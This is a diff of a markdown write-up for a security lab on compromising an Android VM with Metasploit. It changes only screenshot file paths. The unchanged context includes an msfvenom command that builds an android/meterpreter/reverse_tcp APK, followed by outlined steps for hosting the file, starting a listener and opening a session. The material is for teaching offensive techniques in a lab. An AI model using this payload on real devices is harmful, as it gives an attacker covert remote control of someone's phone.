@@ -58,7 +58,7 @@ An Android APK file was prepared for use within the lab environment.
 
 **msfvenom -p android/meterpreter/reverse_tcp LHOST=192.x.x.x LPORT=4444 > android.apk**
 
-![payload](Lab3-screenshots/Payload.png)
+![payload](Lab3_screenshots/Payload.png)
 
 ## Step 2 – Apache Web Server Verification
 
@@ -69,9 +69,9 @@ Purpose:
 * Host files on the local network
 * Allow controlled file transfer to the Android VM
 
-![Apache](Lab3-screenshots/Apache.png)
+![Apache](Lab3_screenshots/Apache.png)
 
-![mv file](Lab3-screenshots/mv-file.png)
+![mv file](Lab3_screenshots/mv-file.png)
 
 
 ## Step 3 – Android File Transfer
@@ -88,9 +88,9 @@ Possible transfer methods include:
 
 For this lab, the APK was transferred within the local testing environment.
 
-![APK](Lab3-screenshots/android-apk.png)
+![APK](Lab3_screenshots/android-apk.png)
 
-![phone](Lab3-screenshots/Android.png)
+![phone](Lab3_screenshots/Android.png)
 
 
 ## Step 4 – Metasploit Listener Configuration
@@ -104,9 +104,9 @@ Concepts covered:
 * Session handling
 * Reverse TCP communication
 
-![msfconsole](Lab3-screenshots/msfconsole.png)
+![msfconsole](Lab3_screenshots/msfconsole.png)
 
-![set](Lab3-screenshots/msfconsole-set.png)
+![set](Lab3_screenshots/msfconsole-set.png)
 
 ## Step 5 – Session Establishment
 
@@ -118,7 +118,7 @@ Learning outcomes:
 * Session interaction
 * Communication verification
 
-![exploit](Lab3-screenshots/exploit.png)
+![exploit](Lab3_screenshots/exploit.png)
 
 ## Post-Exploitation Enumeration
 
